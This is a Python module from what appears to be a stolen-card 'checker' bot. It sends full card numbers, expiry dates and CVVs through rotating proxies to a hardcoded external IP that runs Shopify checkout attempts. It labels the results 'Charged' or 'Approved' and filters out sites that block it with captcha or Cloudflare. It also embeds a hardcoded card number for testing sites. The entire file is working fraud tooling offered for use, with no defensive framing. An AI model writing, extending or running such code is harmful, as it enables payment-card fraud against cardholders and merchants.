"""
checker_bridge.py — Single Shopify API endpoint bridge.

Replaces the old multi-node load balancer with a direct call to:
  http://5.175.222.144:8081/
"""

import asyncio
import aiohttp
import time
import logging
from urllib.parse import quote as _urlquote

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ── Single API endpoint ───────────────────────────────────────────────────────
API_BASE = "http://5.175.222.144:8081"
_REQUEST_TIMEOUT = 120
_CONNECT_TIMEOUT = 5

# ── Persistent aiohttp session ────────────────────────────────────────────────
_session: aiohttp.ClientSession | None = None

async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(
            limit=8000,
            limit_per_host=2000,
            ttl_dns_cache=300,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(
                total=_REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            ),
        )
    return _session


# ── Proxy helper: host:port:user:pass format ──────────────────────────────────

def _proxy_data_to_api_proxy(proxy_data: dict | None) -> str | None:
    """Convert proxy dict to host:port:user:pass format required by the API."""
    if not proxy_data:
        return None
    # If proxy_url is already in host:port:user:pass format, use it
    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str):
        ex = existing.strip()
        if "://" in ex:
            ex = ex.split("://", 1)[1]
        parts = ex.split(":")
        if len(parts) >= 2:
            return ex
    ip    = str(proxy_data.get("ip")   or "").strip()
    port  = str(proxy_data.get("port") or "").strip()
    user  = proxy_data.get("username")
    pw    = proxy_data.get("password")
    if not ip or not port:
        return None
    if user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    return f"{ip}:{port}"


# ── Result normalisation ──────────────────────────────────────────────────────

def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    # API might use different key names — try all common variants
    response = (
        raw.get("Response")
        or raw.get("response")
        or raw.get("message")
        or raw.get("msg")
        or raw.get("status")
        or raw.get("result")
        or raw.get("text")
        or "Unknown"
    )
    price = (
        raw.get("Price")
        or raw.get("price")
        or raw.get("amount")
        or raw.get("Amount")
        or "-"
    )
    gate = (
        raw.get("Gate")
        or raw.get("gate")
        or raw.get("gateway")
        or "Shopify"
    )

    # Ensure string types
    response = str(response) if response is not None else "Unknown"
    price    = str(price) if price is not None else "-"
    gate     = str(gate) if gate is not None else "Shopify"

    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in response:
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
        "card_declined", "do_not_honor", "declined",
        "expired", "risky", "incorrect_number",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "CC":       raw.get("CC", cc_str),
        "Site":     raw.get("Site", site_url),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


# ── Dead-response detection ───────────────────────────────────────────────────

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'cloudflare', 'connection failed',
    'timed out', 'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'http error', 'timeout', 'unreachable',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'http 404', 'url rejected', 'malformed input',
    'amount_too_small', 'site dead', 'captcha_required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'all nodes failed',
)

def _is_dead(response_text: str) -> bool:
    if not response_text:
        return True
    rl = response_text.lower()
    return any(ind in rl for ind in _DEAD_INDICATORS)


# ── Public API ────────────────────────────────────────────────────────────────

async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
    """
    Main async entry point called by bot.py for every CC check.

    Calls the single Shopify API endpoint.  site_url is kept in the
    signature for backward compatibility but is ignored — the API does
    not require a site parameter.
    """
    proxy_str = _proxy_data_to_api_proxy(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /proxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url or "",
        }

    # Build URL exactly like: http://5.175.222.144:8081/?CC|MM|YY|CVV&proxy=host:port:user:pass
    url = f"{API_BASE}/?{cc_str}&proxy={_urlquote(proxy_str, safe=':')}"

    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]

    log.info(f"[bridge] check | cc=...{cc4} | proxy={proxy_str[:30]}...")

    try:
        sess = await _get_session()
        async with sess.get(
            url,
            timeout=aiohttp.ClientTimeout(
                total=_REQUEST_TIMEOUT, connect=_CONNECT_TIMEOUT,
            ),
        ) as resp:
            raw_body = await resp.text()
            try:
                data = await resp.json(content_type=None)
            except Exception:
                # Try parsing from the already-read text
                try:
                    import json
                    data = json.loads(raw_body)
                except Exception:
                    data = {"Response": raw_body.strip(), "Price": "-", "Gate": "Shopify"}

        # DEBUG: log first 200 chars of raw response
        log.info(f"[bridge] RAW | {raw_body[:200]}")

        result = _map_result(data, cc_str, site_url or "")
        log.info(
            f"[bridge] done | {(time.monotonic()-t_start)*1000:.0f}ms"
            f" | status={result.get('Status')} | resp={result.get('Response','')[:60]}"
        )
        return result

    except (asyncio.TimeoutError, TimeoutError) as e:
        log.warning(f"[bridge] TIMEOUT | {str(e)[:80]}")
        return {
            "Response": "Request timed out — proxy slow or API unreachable",
            "Price": "-", "Gate": "-", "Status": "Error",
            "CC": cc_str, "Site": site_url or "",
        }

    except Exception as e:
        err_str = str(e)[:80]
        log.warning(f"[bridge] ERROR | {type(e).__name__}: {err_str}")
        return {
            "Response": f"API error: {err_str}",
            "Price": "-", "Gate": "-", "Status": "Error",
            "CC": cc_str, "Site": site_url or "",
        }


async def test_site(
    site_url:   str,
    proxy_data: dict | None,
    test_card:  str = "4031630422575208|01|2030|280",
) -> dict:
    raw           = await check_card_site(test_card, site_url, proxy_data)
    response_text = raw.get("Response", "")
    price         = raw.get("Price", "-")
    status        = "working"
    if "proxy dead" in response_text.lower():
        status = "proxy_dead"
    elif _is_dead(response_text):
        status = "dead"
    return {"status": status, "response": response_text, "site": site_url, "price": price}


# ── Legacy node management helpers (no-ops — kept for import compatibility) ───

def get_all_nodes() -> list[str]:
    return [API_BASE]

async def check_node_health(node: str) -> bool:
    return node == API_BASE

def is_node_disabled(node: str) -> bool:
    return False

def disable_node(node: str) -> None:
    pass

def enable_node(node: str) -> None:
    pass
